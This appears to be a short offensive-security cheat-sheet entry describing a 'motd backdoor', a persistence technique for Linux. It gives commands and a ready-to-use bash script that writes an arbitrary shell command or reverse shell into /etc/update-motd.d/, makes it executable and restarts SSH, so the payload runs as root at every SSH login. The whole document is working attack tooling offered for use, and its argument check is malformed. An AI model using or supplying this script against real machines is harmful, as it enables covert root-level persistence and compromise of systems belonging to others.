# motd Backdoor

#### motd (message of he day) is printed every time we login via SSH service.&#x20;

we can contaminate the motd file with a reverse shell or a local shell command

```
printf "#!/bin/bash\n$1" | sudo tee /etc/update-motd.d/na
sudo chmod +x /etc/update-motd.d/na
sudo /etc/init.d/ssh start
```

now we can SSH into the machine and get a root shell.

### script:

```
#!/bin/bash

if [ $1 -z ]
then
        echo "$0 <shell commands or binary file path>"
        exit 1
fi

printf "#!/bin/bash\n$1" | sudo tee /etc/update-motd.d/na

sudo chmod +x /etc/update-motd.d/na

sudo /etc/init.d/ssh start

echo "[+] Now try to ssh..."
```
